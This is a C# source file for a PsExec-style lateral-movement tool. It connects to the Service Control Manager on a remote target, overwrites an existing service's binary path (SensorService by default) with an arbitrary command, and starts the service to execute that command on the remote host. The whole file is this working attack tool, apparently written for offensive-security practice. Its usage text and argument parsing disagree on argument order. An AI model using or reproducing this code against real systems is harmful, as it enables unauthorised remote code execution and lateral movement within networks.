using System;
using System.Runtime.InteropServices;

namespace PsCustomExec
{
    class Program
    {
        #region ImportAPI
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string remoteMachineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", EntryPoint = "OpenServiceW", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType,
           int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup,
           string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword,
           string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
        #endregion

        static void Main(string[] args)
        {
            string myApp = AppDomain.CurrentDomain.FriendlyName;
            
            if (args.Length < 2)
            {
                Console.WriteLine($"Usage: {myApp} <TARGET> [ServiceName] <COAMMND>");
                Console.WriteLine($"Example: {myApp} appsrv01 SensorService "
                    + @"C:\windows\system32\cmd.exe /c echo poc > C:\Users\admin\Desktop\poc.txt");
                return;
            }

            string targetHost = args[0];
            string applicationPath = args[1];
            string serviceName = args.Length == 3 ? args[2] : "SensorService";

            uint SC_MANAGER_ALL_ACCESS = 0xF003F;
            uint SERVICE_ALL_ACCESS = 0xF01FF;
            uint SERVICE_NO_CHANGE = 0xffffffff;
            int SERVICE_DEMAND_START = 0x3;
            int SERVICE_ERROR_IGNORE = 0x0;

            //if(args.Length > 0)
            //    applicationPath = string.Join(" ", args);
            //else
            //    Console.WriteLine("You can execute custom commands\n" +
            //        $"Example: {AppDomain.CurrentDomain.FriendlyName} \"{applicationPath}\"");

            Console.WriteLine($"CURRENT COMMAND: Changing service \"{serviceName}\" on target \"{targetHost}\" to be \"{applicationPath}\"");

            // Get Handle on a service locate at SCM (Not a currently running service)
            IntPtr hSCM = OpenSCManager(targetHost, null, SC_MANAGER_ALL_ACCESS);

            // Get access to the service config
           IntPtr hService = OpenService(hSCM, serviceName, SERVICE_ALL_ACCESS);

            // Change the service config, to be exact - change the binary that the service executes (args[3]). Try 0xfffffff in first SERVICE_NO_CHANGE
            bool bChangeConfig = ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                applicationPath, null, null, null, null, null, null);

            if (bChangeConfig)
                Console.WriteLine("Service Reconfigured Scucessfuly");
            else
                Console.WriteLine("Failed to reconfigure service");


            // Start the service.
            // If we wish to add args to our executed binary, specify the number of args as the 2nd paramter
            // and pass string array as the 3th param. This array will be the executable/service args
            bool bStartService = StartService(hService, 0, null);

            if (bStartService)
                Console.WriteLine("Service Launched Scucessfuly");
            else
                Console.WriteLine("Failed to start service");
        }
    }
}